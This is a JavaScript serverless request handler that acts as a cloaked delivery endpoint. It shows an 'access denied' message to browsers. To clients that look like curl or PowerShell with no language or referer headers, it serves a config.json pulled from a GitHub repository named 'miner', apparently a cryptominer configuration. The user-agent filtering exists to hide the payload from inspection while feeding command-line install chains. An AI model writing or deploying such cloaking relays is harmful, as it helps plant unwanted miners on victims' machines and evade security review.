export default async function handler(req, res) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const acceptLang = req.headers['accept-language'];
  const referer = req.headers['referer'];

  const isCli =
    (ua.includes('curl') || ua.includes('powershell')) &&
    !acceptLang &&
    !referer;

  if (!isCli) {
    return res.send('アクセスが拒否されました。');
  }

  const rawUrl =
    'https://raw.githubusercontent.com/5q0r/miner/refs/heads/main/config.json';

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(rawUrl, { signal: controller.signal });
    clearTimeout(timeout);

    if (!response.ok) {
      return res
        .status(502)
        .json({ error: 'リモートファイルの取得に失敗しました', status: response.status });
    }

    const content = await response.text();

    res.setHeader('Content-Type', 'application/json');
    return res.status(200).send(content);
  } catch (error) {
    const message =
      error.name === 'AbortError'
        ? 'Upstream request timed out'
        : 'Internal Server Error';

    return res.status(500).json({ error: message });
  }
}